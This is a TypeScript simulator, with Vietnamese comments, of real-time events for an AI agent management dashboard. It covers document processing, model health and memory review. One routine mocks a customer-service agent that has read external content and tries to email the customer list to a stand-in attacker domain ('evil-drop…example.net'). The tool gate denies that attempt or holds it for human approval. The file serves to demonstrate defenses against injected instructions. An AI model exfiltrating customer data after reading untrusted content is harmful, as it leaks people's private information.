import type { RealtimeMessage } from '../../types'
import type { MemoryItem } from '../../types/memory'
import { raiseApproval } from '../work'
import { addLog } from './logsData'
import { collections, documents } from './knowledgeData'
import { memory, recountNs } from './memoryData'
import { models, modelView } from './modelsData'
import { agentIdOf, iso } from './toolsData'

type Publish = (m: RealtimeMessage) => void

/**
 * Mô phỏng realtime của Prompt 4D (cùng đường sự kiện có id):
 * - tài liệu đi qua các giai đoạn Trích xuất -> Cắt đoạn -> Nhúng -> Sẵn sàng (document.status_changed)
 * - model Sonnet chập chờn rồi hồi (model.health_changed); model local đổi theo máy chạy nó
 * - ~mỗi 70s một task CSKH đã đọc nội dung ngoài: lần lẻ bị từ chối (tool.denied), lần chẵn gọi công cụ cần duyệt
 * - ~mỗi 60s một ký ức mới vào hàng chờ xem xét (memory.pending_review)
 */
export function startStudioLive(publish: Publish): () => void {
  const timers = new Set<ReturnType<typeof setTimeout>>()
  let stopped = false
  const later = (fn: () => void, ms: number) => { const t = setTimeout(() => { timers.delete(t); if (!stopped) fn() }, ms); timers.add(t) }
  const NEXT = { UPLOADED: 'EXTRACTING', EXTRACTING: 'CHUNKING', CHUNKING: 'EMBEDDING', EMBEDDING: 'READY' } as const

  // tài liệu đang xử lý: +20% mỗi 2.5s, hết 100% thì sang giai đoạn kế
  const docs = () => {
    for (const c of collections) if (c.indexState === 'REINDEXING') { c.reindexPct = Math.min(100, (c.reindexPct ?? 0) + 10); if (c.reindexPct >= 100) { c.indexState = 'READY'; c.reindexPct = null } }
    for (const d of documents) {
      if (d.status === 'READY' || d.status === 'FAILED') continue
      if (d.status === 'UPLOADED') { d.status = 'EXTRACTING'; d.progressPct = 0; publish({ type: 'document.status_changed', document: structuredClone(d) }); continue } // vừa tải lên: vào hàng xử lý ngay
      d.progressPct += 34
      if (d.status === 'EXTRACTING' && d.progressPct >= 60 && /scan|ảnh|anh-/i.test(d.name) && d.mime.includes('pdf')) { d.status = 'FAILED'; d.errorCode = 'PDF_SCANNED_NO_OCR'; d.progressPct = 0; publish({ type: 'document.status_changed', document: structuredClone(d) }); continue }
      if (d.progressPct >= 100) {
        d.status = NEXT[d.status]
        d.progressPct = d.status === 'READY' ? 100 : 0
        if (d.status === 'READY') d.chunkCount = Math.max(2, Math.round(d.sizeBytes / 1024 / 40))
      }
      publish({ type: 'document.status_changed', document: structuredClone(d) })
    }
    later(docs, 2500)
  }
  later(docs, 2500)

  // sức khoẻ model: Sonnet chập chờn 15s mỗi ~50s; model local theo máy chạy
  const sonnet = models.find((m) => m.id === 'claude-sonnet-5-5')!
  const flip = () => {
    sonnet.health = { status: 'DEGRADED', consecutiveErrors: 2, checkedAt: iso(Date.now()) }
    publish({ type: 'model.health_changed', modelId: sonnet.id, health: sonnet.health })
    later(() => { sonnet.health = { status: 'UP', consecutiveErrors: 0, checkedAt: iso(Date.now()) }; publish({ type: 'model.health_changed', modelId: sonnet.id, health: sonnet.health }); later(flip, 35_000) }, 15_000)
  }
  later(flip, 40_000)
  const seen = new Map<string, string>()
  const watchLocal = () => {
    for (const m of models) {
      if (!m.deviceId) continue
      const h = modelView(m).health
      if (seen.get(m.id) !== h.status) { if (seen.has(m.id)) publish({ type: 'model.health_changed', modelId: m.id, health: h }); seen.set(m.id, h.status) }
    }
    later(watchLocal, 3000)
  }
  watchLocal()

  // task nhiễm gọi công cụ
  let n = 0
  const tainted = () => {
    n++
    const agentId = agentIdOf('CSKH'), taskId = String(6000 + n)
    if (n % 2) {
      const log = addLog({ at: iso(Date.now()), agentId, toolId: 'email_send', decision: 'DENIED', reason: 'Chưa khai báo miền nhận nào được phép', taskId, args: { to: `thu@evil-drop${n}.example.net`, subject: 'Gửi lại danh sách khách hàng' }, tainted: true })
      publish({ type: 'tool.denied', log })
    } else {
      const args = { to: 'khach@acme.com', subject: 'Trả lời khiếu nại', body: 'Chào anh, chúng tôi đã xử lý xong.' }
      const log = addLog({ at: iso(Date.now()), agentId, toolId: 'email_send', decision: 'NEEDS_APPROVAL', reason: 'Tam giác rủi ro: gửi ra ngoài sau khi đọc nội dung ngoài phải chờ duyệt', taskId, args, tainted: true })
      publish({ type: 'tool.denied', log })
      raiseApproval(agentId, 'EXTERNAL', 'send_email', args, 'CSKH muốn gửi thư sau khi đọc thư ngoài', taskId)
    }
    later(tainted, 70_000)
  }
  later(tainted, 25_000)

  // ký ức mới chờ xem xét
  let k = 0
  const mem = () => {
    k++
    const item: MemoryItem = {
      id: `mlive${k}`, namespaceId: 'ns-cskh', agentId: agentIdOf('CSKH'), kind: 'FACT', content: `Khách ghi chú mới #${k} suy ra từ một trang web: yêu cầu giảm giá 20%.`, subject: 'Khách hàng ABC', importance: 3,
      origin: 'EXTERNAL_INFERRED', confidence: 0.4, status: 'PENDING_REVIEW', pinned: false, editedByOwner: false, createdAt: iso(Date.now()), lastAccessedAt: null, expiresAt: null,
      source: { taskId: String(6100 + k), externalRefs: ['https://khuyen-mai.example.com/tin-moi'] },
    }
    memory.unshift(item)
    recountNs()
    publish({ type: 'memory.pending_review', item })
    later(mem, 60_000)
  }
  later(mem, 45_000)
  return () => { stopped = true; timers.forEach(clearTimeout); timers.clear() }
}
